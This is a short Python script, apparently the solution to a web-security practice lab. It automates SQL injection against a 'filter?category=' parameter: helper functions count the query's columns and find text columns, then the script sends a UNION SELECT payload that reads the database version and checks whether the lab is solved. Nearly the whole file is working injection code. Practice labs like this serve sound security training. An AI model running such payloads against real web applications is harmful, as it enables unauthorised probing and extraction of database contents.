from lib import (
    SESSION,
    check_is_lab_solved,
    generate_parser,
    fetch_target_string,
    find_no_of_columns,
    find_columns_of_type_string,
)

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    target_string = fetch_target_string(lab_url)

    columns = find_no_of_columns(f"{lab_url}/filter?category=", comment="-- -")

    target_columns = find_columns_of_type_string(
        lab_url_with_end_point=f"{lab_url}/filter?category=",
        no_of_columns=columns,
        comment="-- -",
    )

    query = "' UNION SELECT @@version, NULL-- -"

    print(f"[+] Making query: {lab_url}/filter?category={query}")

    response = SESSION.get(f"{lab_url}/filter?category={query}")

    if response.status_code == 200:
        if target_string in response.text:
            print(
                "[+] Successfully queried the database type and version on MySQL and Microsoft"
            )
        else:
            print("[-] The target string is not in the response")
            exit()
    else:
        print("[-] Failed to fetch the database version")
        exit()

    check_is_lab_solved(lab_url)
